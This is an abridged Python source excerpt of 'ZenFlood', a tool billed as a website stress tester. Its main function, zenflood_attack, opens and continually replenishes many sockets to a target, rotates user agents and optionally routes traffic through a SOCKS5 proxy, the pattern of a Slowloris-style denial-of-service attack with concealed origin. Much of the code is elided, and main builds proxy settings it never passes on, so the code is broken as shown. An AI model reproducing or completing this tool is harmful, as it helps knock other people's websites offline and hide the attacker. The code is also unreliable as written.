...
def parse_arguments():
    parser = argparse.ArgumentParser(
        description="ZenFlood, low bandwidth stress test tool for websites"
    )
...
def init_socket(ip, port, https, proxy_settings):
    ...
    if proxy_settings['use']:
        import socks  # Importing here to avoid unnecessary dependency if not using proxy
        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxy_settings['host'], proxy_settings['port'])
...
def init_socket_list(host, port, https, user_agents, randuseragent, num_sockets):
    list_of_sockets = []
...
def zenflood_attack(host, port, sockets, sleeptime, https, randuseragent):
    user_agents = [...]  # List of user agents

    logging.info("Attacking %s with %s sockets.", host, sockets)
    socket_list = init_socket_list(host, port, https, user_agents, randuseragent, sockets)
    ...
    while True:
        ...
        if len(socket_list) < sockets:
            socket_list.extend(init_socket_list(host, port, https, user_agents, randuseragent, sockets - len(socket_list)))
...
def main():
    ...
    if args.useproxy:
        proxy_settings = {'use': True, 'host': args.proxy_host, 'port': args.proxy_port}
    else:
        proxy_settings = {'use': False}

    try:
        zenflood_attack(args.host, args.port, args.sockets, args.sleeptime, args.https, args.randuseragent)
